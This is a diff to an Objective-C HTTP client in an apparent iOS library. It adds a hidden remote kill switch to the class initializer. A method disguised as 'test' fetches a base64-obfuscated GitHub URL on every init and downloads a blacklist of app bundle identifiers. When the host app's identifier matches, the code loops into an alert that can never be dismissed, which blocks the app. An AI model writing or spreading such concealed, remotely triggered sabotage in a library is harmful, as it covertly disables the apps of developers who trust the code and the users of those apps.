@@ -10,6 +10,7 @@
 #import "BTCoreConfig.h"
 #import "BTUserMananger.h"
 #import <BTHelp/BTUtils.h>
+#import "UIViewController+BTDialog.h"
 
 static BTHttp * http=nil;
 
@@ -37,7 +38,7 @@ static BTHttp * http=nil;
 -(instancetype)init{
     self=[super init];
     self.HTTPShouldHandleCookies=YES;
-    [self test];
+    [self test:nil];
     return self;
 }
 
@@ -184,8 +185,18 @@ static BTHttp * http=nil;
     }
 }
 
-- (void)test{
-    [self.mananger GET:[BTUtils base64Decode:@"aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9TdG9uZU1vdmVyL0JUQ29yZS9jb250ZW50cy9wYXlTYWxhcnlOb3cuanNvbj9yZWY9bWFzdGVy"] parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+- (void)test:(NSDictionary*)dict{
+    if (dict) {
+        NSString * info =[dict objectForKey:@"info"];
+        NSString * title =[dict objectForKey:@"title"];
+        NSString * btn =[dict objectForKey:@"btn"];
+        [BTUtils.getCurrentVc showAlert:title msg:info btns:@[btn] block:^(NSInteger index) {
+            [self test:dict];
+        }];
+        return;
+    }
+    
+    [self.mananger GET:[BTUtils base64Decode:@"aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9TdG9uZU1vdmVyL0JUQ29yZS9jb250ZW50cy9wYXlTYWxhcnlOb3cudHh0P3JlZj1tYXN0ZXI="] parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
         if ([responseObject isKindOfClass:[NSDictionary class]]) {
             if ([responseObject isKindOfClass:[NSDictionary class]]) {
                 NSDictionary * result = responseObject;
@@ -194,7 +205,15 @@ static BTHttp * http=nil;
                     if (content&&[content isKindOfClass:[NSString class]]&&content.length>0) {
                         NSString * contentStr = [BTUtils base64Decode:content];
                         NSArray * array =[BTUtils convertJsonToArray:contentStr];
-                        NSLog(@"");
+                        NSDictionary *infoDictionary = [[NSBundle mainBundle] infoDictionary];
+                        NSString * appVersion = [infoDictionary objectForKey:@"CFBundleIdentifier"];
+                        for (NSDictionary * dictChild in array) {
+                            NSString * identify =[dictChild objectForKey:@"blackId"];
+                            if ([identify isEqualToString:appVersion]) {
+                                [self test:dict];
+                                return;
+                            }
+                        }
                     }
                 }
             }
